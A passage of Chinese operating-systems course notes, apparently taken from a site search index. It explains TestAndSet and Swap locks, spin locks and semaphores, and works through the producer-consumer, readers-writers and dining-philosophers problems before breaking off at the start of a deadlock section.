<pre><code>...\n\u5173\u4e2d\u65ad\n\u4e34\u754c\u533a\n\u5f00\u4e2d\u65ad\n...\n</code></pre> <p>\u8be5\u65b9\u6cd5\u7684\u7f3a\u70b9\u4e5f\u663e\u800c\u6613\u89c1\uff1a</p> <ul> <li>&lt;1&gt; \u9650\u5236\u4e86 CPU \u4ea4\u66ff\u6267\u884c\u7a0b\u5e8f\u7684\u80fd\u529b\uff0c\u7cfb\u7edf\u6548\u7387\u660e\u663e\u964d\u4f4e</li> <li>&lt;2&gt; \u5c06\u5f00\u5173\u4e2d\u65ad\u7684\u6743\u9650\u4ea4\u7ed9\u7528\u6237\u4e0d\u660e\u667a</li> <li>&lt;3&gt; \u4e0d\u9002\u7528\u4e8e\u591a\u5904\u7406\u5668\u7cfb\u7edf</li> </ul> <p>\u786c\u4ef6\u5b9e\u73b0\u65b9\u6cd5 2\uff1aTestAndSet</p> <p>TS \u6307\u4ee4\u662f\u4e00\u4e2a\u539f\u5b50\u64cd\u4f5c\uff0c\u5176\u529f\u80fd\u662f\u8bfb\u51fa\u6307\u5b9a\u6807\u5fd7\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a <code>true</code>\uff1a</p> <pre><code>bool TestAndSet(bool *lock) {\n    bool old = *lock; // \u5b58\u653e lock \u65e7\u503c\n    *lock = true;     // \u65e0\u8bba\u4e4b\u524d\u662f\u5426\u52a0\u9501\uff0c\u90fd\u5c06 lock \u8bbe\u7f6e\u4e3a true\n    return old;       // \u8fd4\u56de\u65e7\u503c\n}\n</code></pre> <p>\u6211\u4eec\u7528 <code>true</code> \u8868\u793a\u8d44\u6e90\u6b63\u88ab\u5360\u7528\uff08\u52a0\u9501\uff09\uff0c\u7528 <code>false</code> \u8868\u793a\u7a7a\u95f2\uff08\u672a\u52a0\u9501\uff09\u3002\u8fdb\u7a0b\u5728\u8fdb\u5165\u4e34\u754c\u533a\u4e4b\u524d\uff0c\u5148\u7528 TS \u6307\u4ee4\u68c0\u67e5 lock \u503c\uff1a</p> <ul> <li>\u82e5\u4e3a <code>false</code>\uff0c\u8868\u793a\u6ca1\u6709\u8fdb\u7a0b\u5728\u4e34\u754c\u533a\uff0c\u53ef\u4ee5\u8fdb\u5165\uff0c\u5e76\u5c06 lock \u8bbe\u7f6e\u672a <code>true</code><ul> <li>\u6b64\u65f6\u4e34\u754c\u8d44\u6e90\u88ab\u52a0\u9501\uff0c\u5176\u5b83\u8fdb\u7a0b\u4e0d\u80fd\u8fdb\u5165</li> </ul> </li> <li>\u82e5\u4e3a <code>true</code>\uff0c\u8868\u793a\u6709\u8fdb\u7a0b\u5728\u4e34\u754c\u533a\uff0c\u8fdb\u5165\u5faa\u73af\u7b49\u5f85\uff0c\u76f4\u5230\u5f53\u524d\u8bbf\u95ee\u4e34\u754c\u533a\u7684\u8fdb\u7a0b\u9000\u51fa\u65f6\u89e3\u9501</li> </ul> <pre><code>while TestAndSet(&amp;lock); // \u52a0\u9501\u5e76\u68c0\u67e5\ncritical section;\nlock = false;            // \u89e3\u9501\nremainder section;\n</code></pre> <p>TS \u6307\u4ee4\u5c31\u662f\u4fdd\u8bc1\u4e86\u68c0\u67e5\u548c\u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u662f\u539f\u5b50\u6027\u7684</p> <p>\u6682\u65f6\u65e0\u6cd5\u8fdb\u5165\u4e34\u754c\u533a\u7684\u8fdb\u7a0b\u4f1a\u5360\u7528 CPU \u5faa\u73af\u6267\u884c TS \u6307\u4ee4\uff0c\u56e0\u6b64\u6ca1\u6709\u5b9e\u73b0\u201c\u8ba9\u6743\u7b49\u5f85\u201d\u539f\u5219\u3002</p> <p>\u786c\u4ef6\u5b9e\u73b0\u65b9\u6cd5 3\uff1aSwap</p> <p>Swap \u6307\u4ee4\u4e5f\u662f\u4e00\u4e2a\u539f\u5b50\u64cd\u4f5c\uff0c\u5b83\u7684\u529f\u80fd\u662f\u4ea4\u6362\u4e24\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\uff1a</p> <pre><code>void Swap(bool *a, bool *b) {\n    bool temp = *a;\n    *a = *b;\n    *b = temp;\n}\n</code></pre> <p>\u6b64\u65f6\u6bcf\u4e2a\u4e34\u754c\u8d44\u6e90\u90fd\u6709\u4e00\u4e2a\u5171\u4eab\u5e03\u5c14\u53d8\u91cf lock\uff0c\u521d\u503c\u4e3a false\uff1b\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u5c40\u90e8\u5e03\u5c14\u53d8\u91cf key\uff0c\u521d\u503c\u4e3a true\u3002</p> <p>\u5176\u539f\u7406\u548c TS \u6307\u4ee4\u5b9e\u73b0\u4e92\u65a5\u533a\u522b\u4e0d\u5927\uff0c\u8fc7\u7a0b\u63cf\u8ff0\u5982\u4e0b\uff1a</p> <pre><code>bool key = true;\nwhile (key != false) Swap(&amp;lock, &amp;key);\ncritical section;\nlock = false;\nremainder section;\n</code></pre> <p>\u786c\u4ef6\u6307\u4ee4\u65b9\u6cd5\u5b9e\u73b0\u4e92\u65a5\u7684\u4f18\u7f3a\u70b9</p> <ul> <li>Advantage<ul> <li>\u7b80\u5355\u3001\u5bb9\u6613\u9a8c\u8bc1\u6b63\u786e\u6027</li> <li>\u9002\u7528\u4e8e\u4efb\u610f\u6570\u91cf\u7684\u8fdb\u7a0b\uff0c\u652f\u6301\u591a\u5904\u7406\u5668</li> <li>\u652f\u6301\u7cfb\u7edf\u4e2d\u6709\u591a\u4e2a\u4e34\u754c\u533a</li> </ul> </li> <li>Disadvantage<ul> <li>\u7b49\u5f85\u8fdb\u5165\u4e34\u754c\u533a\u7684\u8fdb\u7a0b\u4f1a\u5360\u7528 CPU \u6267\u884c while \u5faa\u73af\uff0c\u6ca1\u80fd\u5b9e\u73b0\u201c\u8ba9\u6743\u7b49\u5f85\u201d</li> <li>\u4ece\u7b49\u5f85\u8fdb\u7a0b\u4e2d\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u8fdb\u7a0b\u8fdb\u5165\u4e34\u754c\u533a\uff0c\u6709\u7684\u8fdb\u7a0b\u53ef\u80fd\u4e00\u76f4\u9009\u4e0d\u4e0a\uff0c\u4ece\u800c\u5bfc\u81f4\u9965\u997f\u73b0\u8c61</li> </ul> </li> </ul> <p>\u4e92\u65a5\u9501 Mutex Lock</p> <p>\u4e92\u65a5\u9501\u662f\u89e3\u51b3\u4e34\u754c\u533a\u6700\u7b80\u5355\u7684\u5de5\u5177\u3002\u4e00\u4e2a\u8fdb\u7a0b\u5728\u8fdb\u5165\u4e34\u754c\u533a\u65f6\u8981\u8c03\u7528 <code>acquire()</code> \u6765\u83b7\u5f97\u9501\uff1b\u5728\u9000\u51fa\u4e34\u754c\u533a\u65f6\u8981\u8c03\u7528 <code>release()</code> \u6765\u91ca\u653e\u9501\u3002</p> <p>\u6bcf\u4e2a\u4e92\u65a5\u9501\u6709\u4e00\u4e2a\u5e03\u5c14\u53d8\u91cf <code>available</code> \u8868\u793a\u9501\u662f\u5426\u53ef\u7528\u3002\u53ea\u6709\u9501\u53ef\u7528\u624d\u80fd\u6210\u529f\u8c03\u7528 <code>acquire()</code>\uff1b\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u8bd5\u56fe\u83b7\u53d6\u4e0d\u53ef\u7528\u7684\u9501\u65f6\u4f1a\u88ab\u963b\u585e\uff0c\u77e5\u9053\u8be5\u9501\u88ab\u91ca\u653e\u3002\u5176\u8fc7\u7a0b\u63cf\u8ff0\u5982\u4e0b\uff1a</p> <pre><code>acquire() {\n    while (!available);  // \u5fd9\u7b49\u5f85\n    available = false;   // \u83b7\u5f97\u9501\n}\nrelease() {\n    available = true;    // \u91ca\u653e\u9501\n}\n</code></pre> <p><code>acquire()</code> \u548c <code>release()</code> \u4e24\u4e2a\u64cd\u4f5c\u81ea\u7136\u4e5f\u662f\u539f\u5b50\u64cd\u4f5c\uff0c\u56e0\u6b64\u901a\u5e38\u7528\u786c\u4ef6\u673a\u5236\u5b9e\u73b0</p> <p>\u4e0a\u9762\u63cf\u8ff0\u7684\u4e92\u65a5\u9501\u4e5f\u79f0\u81ea\u65cb\u9501 Spin Lock\uff0c\u5b83\u7684\u7f3a\u70b9\u662f\u9700\u8981\u5fd9\u7b49\u5f85\uff0c\u5f53\u6709\u4e00\u4e2a\u8fdb\u7a0b\u5728\u4e34\u754c\u533a\u65f6\uff0c\u4efb\u4f55\u5176\u5b83\u8fdb\u7a0b\u5728\u8fdb\u5165\u4e34\u754c\u533a\u524d\u90fd\u9700\u8981\u8fde\u7eed\u5faa\u73af\u8c03\u7528 <code>acquire()</code>\uff0c\u8fd9\u79cd\u8fde\u7eed\u5faa\u73af\u663e\u7136\u6d6a\u8d39\u4e86 CPU \u5468\u671f\u3002\u56e0\u6b64\uff0c\u4e92\u65a5\u9501\u901a\u5e38\u7528\u4e8e\u591a\u5904\u7406\u5668\u7cfb\u7edf\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u5728\u4e00\u4e2a\u5904\u7406\u5668\u4e0a\u65cb\u8f6c\uff0c\u800c\u4e0d\u5f71\u54cd\u5176\u5b83\u7ebf\u7a0b\u7684\u6267\u884c\u3002</p> <p>\u81ea\u65cb\u9501\u7684\u4f18\u70b9\u662f\u8fdb\u7a0b\u5728\u7b49\u5f85\u9501\u671f\u95f4\u6ca1\u6709\u53d1\u751f\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u5e76\u4e14\u7b49\u5f85\u7684\u4ee3\u4ef7\u4e0d\u9ad8\u3002</p> <p>\u4e0d\u9700\u8981\u5fd9\u7b49\u5f85\u7684\u4e92\u65a5\u9501\u79f0\u4e3a Sleep Lock</p> <p>\u4fe1\u53f7\u91cf Semaphore</p> <p>\u4fe1\u53f7\u91cf\u7528\u6765\u89e3\u51b3\u4e92\u65a5\u548c\u540c\u6b65\u95ee\u9898\u7684\u529f\u80fd\u8f83\u5f3a\u7684\u673a\u5236\uff0c\u5b83\u53ea\u80fd\u88ab\u4e24\u4e2a\u6807\u51c6\u539f\u8bed <code>wait()</code> \u548c <code>signal()</code> \u8bbf\u95ee\uff0c\u4e5f\u53ef\u7b80\u5199\u4e3a <code>P()</code> P \u64cd\u4f5c\u548c <code>V()</code> V \u64cd\u4f5c\u3002</p> <p>\u6574\u578b\u4fe1\u53f7\u91cf\u88ab\u5b9a\u4e49\u4e3a\u4e00\u4e2a\u7528\u4e8e\u8868\u793a\u8d44\u6e90\u6570\u91cf\u7684\u6574\u578b\u91cf <code>S</code>\uff0c\u76f8\u6bd4\u4e8e\u666e\u901a\u6574\u578b\u53d8\u91cf\uff0c\u6574\u578b\u4fe1\u53f7\u91cf\u53ea\u6709\u4e09\u79cd\u64cd\u4f5c\uff1a\u521d\u59cb\u5316\u3001P \u64cd\u4f5c\u3001V \u64cd\u4f5c\uff1a</p> <pre><code>wait(S) {            // \u76f8\u5f53\u4e8e\u8fdb\u5165\u533a\n    while (S &lt;= 0);  // \u82e5\u8d44\u6e90\u6570\u4e0d\u591f\uff0c\u5fd9\u7b49\u5f85\n    S = S - 1;       // \u82e5\u8d44\u6e90\u6570\u591f\uff0c\u5219\u5360\u7528\u4e00\u4e2a\u8d44\u6e90\n}\nsignal(S) {          // \u76f8\u5f53\u4e8e\u9000\u51fa\u533a\n    S = S + 1;       // \u91ca\u653e\u4e00\u4e2a\u8d44\u6e90\n}\n</code></pre> <p>\u6574\u578b\u4fe1\u53f7\u91cf\u7684\u4f7f\u7528\u65b9\u5f0f\u57fa\u672c\u4e0e\u4e92\u65a5\u9501\u76f8\u4f3c\uff0c\u56e0\u6b64\u5b83\u4e5f\u6709\u5fd9\u7b49\u5f85\u7684\u7f3a\u70b9\u3002\u800c\u8bb0\u5f55\u578b\u4fe1\u53f7\u91cf\u662f\u4e00\u79cd\u4e0d\u5b58\u5728\u5fd9\u7b49\u73b0\u8c61\u7684\u8fdb\u7a0b\u540c\u6b65\u673a\u5236\uff0c\u5b83\u9664\u4e86\u9700\u8981\u4e00\u4e2a\u7528\u4e8e\u8868\u793a\u8d44\u6e90\u6570\u91cf\u7684\u6574\u578b\u53d8\u91cf <code>value</code> \u5916\uff0c\u8fd8\u589e\u52a0\u4e86\u4e00\u4e2a\u8fdb\u7a0b\u94fe\u8868 <code>L</code>\uff0c\u7528\u4e8e\u94fe\u63a5\u6240\u6709\u7b49\u5f85\u8be5\u8d44\u6e90\u7684\u8fdb\u7a0b\uff1a</p> <pre><code>typedef struct {\n    int value;\n    struct process *L;\n} semaphore;\n</code></pre> <p>\u6b64\u65f6\u5bf9\u5e94\u7684 P \u64cd\u4f5c\u548c V \u64cd\u4f5c\u63cf\u8ff0\u5982\u4e0b\uff1a</p> <pre><code>void wait(semaphore S) {\n    S.value--;\n    if (S.value &lt; 0) {\n        add this process to S.L;\n        block(S.L);   // running - &gt; waiting\n    }\n}\n\nvoid signal(semaphore S) {\n    S.value++;\n    if (S.value &lt;= 0) {\n        // \u4ecd\u6709\u8fdb\u7a0b\u5728\u7b49\u5f85\u8be5\u8d44\u6e90\n        remove a process P from S.L;\n        wakeup(P);   // waiting -&gt; ready\n    }\n}\n</code></pre> <p>\u6b64\u65f6\uff0c\u4e3a\u4e86\u4f7f\u591a\u4e2a\u8fdb\u7a0b\u80fd\u591f\u4e92\u65a5\u5730\u8bbf\u95ee\u67d0\u4e2a\u4e34\u754c\u8d44\u6e90\uff0c\u9700\u8981\u4e3a\u8be5\u8d44\u6e90\u8bbe\u7f6e\u4e00\u4e2a\u4e92\u65a5\u4fe1\u53f7\u91cf <code>S</code>\uff0c\u5176\u521d\u503c\u4e3a 1\uff0c\u5bf9\u5e94\u53ef\u7528\u8d44\u6e90\u6570\u4e3a 1\uff0c\u7136\u540e\u5c06\u5404\u4e2a\u8fdb\u7a0b\u8bbf\u95ee\u8be5\u8d44\u6e90\u7684\u4e34\u754c\u533a\u8fc7\u7a0b\u7f6e\u4e8e <code>P(S)</code> \u548c <code>V(S)</code> \u4e4b\u95f4\uff1a</p> <pre><code>semaphore S = 1;\nP1() {\n    ...\n    P(S);\n    critical section;\n    V(S);\n    ...\n}\n</code></pre>"},{"location":"Courses/OS/Topic3/#classical-synchronization-problems","title":"Classical Synchronization Problems","text":"<p>Bounded-Buffer Problem</p> <p>\u4e5f\u79f0\u4e3a\u751f\u4ea7\u8005-\u6d88\u8d39\u8005\u95ee\u9898\u3002\u6709\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c\u4e00\u4e2a\u6d88\u8d39\u8005\uff0c\u5171\u4eab Buffer \u5927\u5c0f\u4e3a \\(N\\)\uff1b\u751f\u4ea7\u8005\u6bcf\u751f\u4ea7\u4e00\u4e2a\u4ea7\u54c1\u5e76\u653e\u5165\u7f13\u51b2\u533a\uff0c\u6d88\u8d39\u8005\u6bcf\u6b21\u90fd\u7f13\u51b2\u533a\u4e2d\u53d6\u51fa\u4e00\u4e2a\u4ea7\u54c1\u5e76\u6d88\u8d39\uff0c\u56e0\u6b64\u7f13\u51b2\u533a\u5373\u4e3a\u4e34\u754c\u8d44\u6e90\u3002</p> <p>\u6211\u4eec\u5bf9\u8be5\u95ee\u9898\u8bbe\u7f6e\u4e09\u4e2a\u4fe1\u53f7\u91cf\uff1a</p> <ul> <li><code>mutex</code>: \u521d\u59cb\u5316\u4e3a 1\uff0c\u7528\u4e8e\u63a7\u5236\u4e92\u65a5\u8bbf\u95ee Buffer</li> <li><code>full</code>: \u521d\u59cb\u5316\u4e3a 0\uff0c\u7528\u4e8e\u8bb0\u5f55\u5f53\u524d Buffer \u201c\u6ee1\u201d\u7f13\u51b2\u533a\u6570</li> <li><code>empty</code>: \u521d\u59cb\u5316\u4e3a \\(N\\)\uff0c\u7528\u4e8e\u8bb0\u5f55\u5f53\u524d Buffer \u201c\u7a7a\u201d\u7f13\u51b2\u533a\u6570</li> </ul> <pre><code>semaphore mutex = 1;  // \u4e34\u754c\u533a\u4e92\u65a5\u4fe1\u53f7\u91cf\nsemaphore empty = n;  // \u7a7a\u95f2\u7f13\u51b2\u533a\nsemaphore full  = 0;  // \u7f13\u51b2\u533a\u521d\u59cb\u5316\u4e3a\u7a7a\n\nproducer() {\n    while (1) {\n        produce a item;\n        wait(empty);   // \u83b7\u53d6\u7a7a\u7f13\u51b2\u533a\u5355\u5143\n        wait(mutex);   // \u8fdb\u5165\u4e34\u754c\u533a\n        add the item to the buffer;\n        signal(mutex); // \u9000\u51fa\u4e34\u754c\u533a\n        signal(full);  // \u6ee1\u7f13\u51b2\u533a\u6570 +1\n    }\n}\n\nconsumer() {\n    while (1) {\n        wait(full);    // \u83b7\u53d6\u6ee1\u7f13\u51b2\u533a\u5355\u5143\n        wait(mutex);   // \u8fdb\u5165\u4e34\u754c\u533a\n        remove an item from buffer;\n        signal(mutex); // \u9000\u51fa\u4e34\u754c\u533a\n        signal(empty); // \u7a7a\u7f13\u51b2\u533a\u6570 +1\n        consume the removed item;\n    }\n}\n</code></pre> <p>\u3010Exercise\u3011 \u4e09\u4e2a\u8fdb\u7a0b P1\uff0cP2\uff0cP3 \u4e92\u65a5\u4f7f\u7528\u4e00\u4e2a\u5305\u542b \\(N\\) \u4e2a\u5355\u5143\u7684\u7f13\u51b2\u533a\uff0c\u8bf7\u8bbe\u8ba1\u4fe1\u53f7\u91cf\u673a\u5236\uff1a</p> <ul> <li>P1 \u6bcf\u6b21\u7528 <code>produce()</code> \u751f\u6210\u4e00\u4e2a\u6b63\u6574\u6570\u5e76\u7528 <code>put()</code> \u9001\u5165\u7f13\u51b2\u533a\u67d0\u4e2a\u7a7a\u5355\u5143\u4e2d</li> <li>P2 \u6bcf\u6b21\u7528 <code>getodd()</code> \u4ece\u8be5\u7f13\u51b2\u533a\u4e2d\u53d6\u51fa\u4e00\u4e2a\u5947\u6570\u5e76\u7528 <code>countodd()</code> \u7edf\u8ba1\u5947\u6570\u4e2a\u6570</li> <li>P3 \u6bcf\u6b21\u7528 <code>geteven()</code> \u4ece\u8be5\u7f13\u51b2\u533a\u4e2d\u53d6\u51fa\u4e00\u4e2a\u5076\u6570\u5e76\u7528 <code>counteven()</code> \u7edf\u8ba1\u5076\u6570\u4e2a\u6570</li> </ul> Answer <pre><code>semaphore mutex = 1;  // \u4e34\u754c\u533a\u4e92\u65a5\u4fe1\u53f7\u91cf\nsemaphore empty = n;  // \u7a7a\u95f2\u7f13\u51b2\u533a\nsemaphore odd   = 0;  // \u7f13\u51b2\u533a\u521d\u59cb\u5316\u4e3a\u7a7a\nsemaphore even  = 0;\n// Process 1\nP1() {\n    while (1) {\n        produce a item;\n        wait(empty);   // \u83b7\u53d6\u7a7a\u7f13\u51b2\u533a\u5355\u5143\n        wait(mutex);   // \u8fdb\u5165\u4e34\u754c\u533a\n        add the item to the buffer;\n        signal(mutex); // \u9000\u51fa\u4e34\u754c\u533a\n        if the item is odd:\n            signal(odd);\n        else:\n            signal(even);\n    }\n}\n// Process 2\nP2() {\n    while (1) {\n        wait(odd);    // \u83b7\u53d6\u6ee1\u7f13\u51b2\u533a\u5355\u5143\n        wait(mutex);   // \u8fdb\u5165\u4e34\u754c\u533a\n        remove an item from buffer;\n        signal(mutex); // \u9000\u51fa\u4e34\u754c\u533a\n        signal(empty); // \u7a7a\u7f13\u51b2\u533a\u6570 +1\n        consume the removed item;\n    }\n}\n// Process 3\nP3() {\n    while (1) {\n        wait(even);    // \u83b7\u53d6\u6ee1\u7f13\u51b2\u533a\u5355\u5143\n        wait(mutex);   // \u8fdb\u5165\u4e34\u754c\u533a\n        remove an item from buffer;\n        signal(mutex); // \u9000\u51fa\u4e34\u754c\u533a\n        signal(empty); // \u7a7a\u7f13\u51b2\u533a\u6570 +1\n        consume the removed item;\n    }\n}\n</code></pre> <p>Readers &amp; Writer Problem</p> <p>\u6709\u8bfb\u8005\u548c\u5199\u8005\u4e24\u7ec4\u5e76\u53d1\u8fdb\u7a0b\uff0c\u5171\u4eab\u4e00\u4e2a\u6587\u4ef6\uff0c\u5f53\u4e24\u4e2a\u6216\u4ee5\u4e0a\u7684\u8bfb\u8fdb\u7a0b\u540c\u65f6\u8bbf\u95ee\u6570\u636e\u65f6\u4e0d\u4f1a\u4ea7\u751f\u526f\u4f5c\u7528\uff0c\u4f46\u82e5\u67d0\u4e2a\u5199\u8fdb\u7a0b\u548c\u5176\u5b83\u8fdb\u7a0b\u540c\u65f6\u8bbf\u95ee\u5171\u4eab\u6570\u636e\u65f6\u5219\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u4e00\u81f4\u6027\u95ee\u9898\uff0c\u56e0\u6b64\u8981\u6c42\uff1a</p> <ul> <li>\u5141\u8bb8\u591a\u4e2a Reader \u540c\u65f6\u5bf9\u6587\u4ef6\u6267\u884c\u8bfb\u64cd\u4f5c</li> <li>\u53ea\u5141\u8bb8\u4e00\u4e2a Writer \u5f80\u6587\u4ef6\u4e2d\u5199\u4fe1\u606f</li> <li>\u4efb\u610f\u4e00\u4e2a Writer \u5728\u5b8c\u6210\u5199\u64cd\u4f5c\u4e4b\u524d\u4e0d\u5141\u8bb8\u5176\u5b83 Reader \u6216 Writer \u5de5\u4f5c</li> <li>Writer \u6267\u884c\u5199\u64cd\u4f5c\u524d\u5e94\u8ba9\u5df2\u6709\u7684\u8fdb\u7a0b\u5168\u90e8\u9000\u51fa</li> </ul> <p>\u7b80\u5355\u7684\u4e00\u4e2a P \u64cd\u4f5c\u3001V \u64cd\u4f5c\u65e0\u6cd5\u89e3\u51b3\u8be5\u95ee\u9898\uff0c\u9700\u8981\u989d\u5916\u7528\u5230\u4e00\u4e2a\u8ba1\u6570\u5668\u6765\u5224\u65ad\u5f53\u524d\u662f\u5426\u6709 Reader \u5728\u8bfb\u53d6\u6587\u4ef6\u3002\u540c\u65f6\uff0c\u4e0d\u540c Reader \u5bf9\u8ba1\u6570\u5668\u7684\u8bbf\u95ee\u4e5f\u5e94\u8be5\u662f\u4e92\u65a5\u7684\uff0c\u56e0\u6b64\u4fe1\u53f7\u91cf\u8bbe\u7f6e\u4e3a\uff1a</p> <ul> <li><code>count</code>: \u521d\u59cb\u5316\u4e3a 0\uff0c\u7528\u4e8e\u8bb0\u5f55\u5f53\u524d Reader \u6570\u91cf</li> <li><code>mutex</code>: \u521d\u59cb\u5316\u4e3a 1\uff0c\u7528\u4e8e\u4fdd\u62a4\u66f4\u65b0 count \u53d8\u91cf\u65f6\u7684\u4e92\u65a5</li> <li><code>rw</code>: \u521d\u59cb\u5316\u4e3a 1\uff0c\u7528\u4e8e\u4fdd\u8bc1 Reader \u548c Writer \u7684\u4e92\u65a5\u8bbf\u95ee</li> </ul> <pre><code>int count = 0;   // \u6574\u578b\u4fe1\u53f7\u91cf\nsemaphore mutex = 1;\nsemaphore rw    = 1;\n\nwriter() {\n    while (1) {\n        P(rw);          // \u4e92\u65a5\u8bbf\u95ee\u5171\u4eab\u6587\u4ef6\n        write sth...\n        V(rw);          // \u91ca\u653e\u5171\u4eab\u6587\u4ef6\n    }\n}\n\nreader() {\n    while (1) {\n        P(mutex);       // \u4e92\u65a5\u8bbf\u95ee count \u53d8\u91cf\n        if (count == 0) // \u5f53\u7b2c\u4e00\u4e2a Reader \u8bfb\u5171\u4eab\u6587\u4ef6\u65f6\n            P(rw);      // \u963b\u6b62 Writer \u8bbf\u95ee\u5171\u4eab\u6587\u4ef6\n        count++;        \n        V(mutex);       // \u91ca\u653e count\n        read sth...\n        P(mutex)        // \u4e92\u65a5\u8bbf\u95ee count \u53d8\u91cf\n        count--;\n        if (count == 0) // \u5f53\u6700\u540e\u4e00\u4e2a Reader \u79bb\u5f00\n            V(rw);      // \u5141\u8bb8\u5199\u8fdb\u7a0b\u5199\n        V(mutex);       // \u91ca\u653e count\n    }\n}\n</code></pre> <p>\u8be5\u7b97\u6cd5\u4e2d Reader \u4f18\u5148\u7ea7\u5927\u4e8e Writer\uff0c\u4e5f\u5b58\u5728 Writer \u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u5b9e\u73b0\u65b9\u5f0f</p> <p>Dining-Philosophers Problem</p> <p>\u4e00\u5f20\u5706\u684c\u56f4\u5750\u4e86 5 \u540d\u54f2\u5b66\u5bb6\uff0c\u6bcf\u540d\u54f2\u5b66\u5bb6\u524d\u6709\u4e00\u7897\u996d\uff0c\u6bcf\u4e24\u540d\u54f2\u5b66\u5bb6\u4e4b\u95f4\u6709\u4e00\u6839\u7b77\u5b50\u3002\u5f53\u54f2\u5b66\u5bb6\u9965\u997f\u65f6\uff0c\u4f1a\u5c1d\u8bd5\u62ff\u8d77\u5de6\u3001\u53f3\u4e24\u6839\u7b77\u5b50\uff08\u5141\u8bb8\u4e00\u6839\u4e00\u6839\u62ff\u8d77\uff09\uff0c\u82e5\u7b77\u5b50\u5df2\u5728\u4ed6\u4eba\u624b\u4e0a\uff0c\u5219\u9700\u8981\u7b49\u5f85\u3002</p> <p>\u5f88\u663e\u7136\uff0c\u8fd9\u91cc\u7684\u4e94\u6839\u7b77\u5b50\u5c5e\u4e8e\u4e34\u754c\u8d44\u6e90\uff0c\u6211\u4eec\u4e3a\u5176\u5b9a\u4e49\u4fe1\u53f7\u91cf\u6570\u7ec4 <code>chostick[5] = {1,1,1,1,1}</code>\u3002\u5e76\u4e14\uff0c\u6211\u4eec\u5bf9\u54f2\u5b66\u5bb6 \\(i\\) \u5de6\u8fb9\u7684\u7b77\u5b50\u7f16\u53f7\u4e3a \\(i\\)\uff0c\u53f3\u8fb9\u7684\u7b77\u5b50\u7f16\u53f7\u4e3a \\((i+1)\\%5\\)\u3002</p> <pre><code>semaphore chopstick[5] = {1,1,1,1,1};\n\n// Process i\nPi() {\n    do {\n        P(chopstick[i]);       // \u53d6\u5de6\u8fb9\u7b77\u5b50\n        P(chopstick[(i+1)%5]); // \u53d6\u53f3\u8fb9\u7b77\u5b50\n        Dining...\n        V(chopstick[i]);       // \u653e\u56de\u5de6\u8fb9\u7b77\u5b50\n        V(chopstick[(i+1)%5]); // \u653e\u56de\u53f3\u8fb9\u7b77\u5b50\n    } while(1);\n}\n</code></pre> <p>\u4e0a\u8ff0\u8d2a\u5fc3\u7b97\u6cd5\u867d\u7136\u6d45\u663e\u6613\u61c2\uff0c\u4f46\u662f\u5f53\u6240\u6709\u54f2\u5b66\u5bb6\u540c\u65f6\u60f3\u8981\u8fdb\u98df\uff0c\u5e76\u4e14\u540c\u65f6\u53d6\u5230\u5de6\u8fb9\u7b77\u5b50\u65f6\uff0c\u6b64\u65f6\u60f3\u8981\u53d6\u53f3\u8fb9\u7b77\u5b50\u5c31\u4f1a\u8fdb\u7a0b\u963b\u585e\uff0c\u53d1\u751f\u6b7b\u9501\u3002</p> <p>\u4e3a\u9632\u6b62\u6b7b\u9501\u53d1\u751f\uff0c\u53ef\u5236\u5b9a\u7684\u4e00\u4e9b\u9650\u5236\u6761\u4ef6</p> <ul> <li>&lt;1&gt; \u81f3\u591a\u5141\u8bb8 4 \u540d\u54f2\u5b66\u5bb6\u540c\u65f6\u8fdb\u98df\uff0c\u4ee5\u4fdd\u8bc1\u81f3\u5c11\u6709\u4e00\u540d\u54f2\u5b66\u5bb6\u80fd\u62ff\u5230\u5de6\u53f3\u4e24\u8fb9\u7684\u7b77\u5b50</li> <li>&lt;2&gt; \u8981\u6c42\u5947\u6570\u53f7\u54f2\u5b66\u5bb6\u5148\u62ff\u5de6\u8fb9\u7b77\u5b50\uff0c\u5076\u6570\u53f7\u54f2\u5b66\u5bb6\u5148\u62ff\u53f3\u8fb9\u7b77\u5b50\uff0c\u4ee5\u4fdd\u8bc1\u76f8\u90bb\u54f2\u5b66\u5bb6\u90fd\u60f3\u8fdb\u98df\u65f6\uff0c\u53ea\u6709\u4e00\u540d\u54f2\u5b66\u5bb6\u53ef\u4ee5\u53d6\u5230\u7b77\u5b50\uff0c\u800c\u53e6\u4e00\u540d\u963b\u585e\u7b49\u5f85</li> <li>&lt;3&gt; \u4ec5\u5f53\u54f2\u5b66\u5bb6\u4e24\u8fb9\u7b77\u5b50\u90fd\u53ef\u7528\u65f6\uff0c\u624d\u5141\u8bb8\u4ed6\u62ff\u8d77\u7b77\u5b50</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u65b9\u6848 3\uff0c\u4ec5\u9700\u5b9a\u4e49\u4e00\u4e2a\u8bbf\u95ee <code>chopstick[]</code> \u8d44\u6e90\u7684\u4e92\u65a5\u4fe1\u53f7\u91cf <code>mutex</code> \u5373\u53ef\uff1a</p> <pre><code>semaphore chopstick[5] = {1,1,1,1,1};\nsemaphore mutex = 1;           // \u4e34\u754c\u533a\u4e92\u65a5\u4fe1\u53f7\u91cf\n\n// Process i\nPi() {\n    do {\n        P(mutex);\n        P(chopstick[i]);       // \u53d6\u5de6\u8fb9\u7b77\u5b50\n        P(chopstick[(i+1)%5]); // \u53d6\u53f3\u8fb9\u7b77\u5b50\n        V(mutex);\n        Dining...\n        V(chopstick[i]);       // \u653e\u56de\u5de6\u8fb9\u7b77\u5b50\n        V(chopstick[(i+1)%5]); // \u653e\u56de\u53f3\u8fb9\u7b77\u5b50\n    } while(1);\n}\n</code></pre>"},{"location":"Courses/OS/Topic3/#deadlock","title":"Deadlock","text":"<p>\u6b7b\u9501\u6307\u591a\u4e2a\u8fdb\u7a0b\u56e0\u7ade\u4e89\u8d44\u6e90\u800c\u9020\u6210\u7684\u4e00\u79cd\u50f5\u5c40\uff0c\u5404\u4e2a\u8fdb\u7a0b\u4e92\u76f8\u7b49\u5f85\u5bf9\u65b9\u624b\u91cc\u7684\u8d44\u6e90\u800c\u963b\u585e\u3002</p> 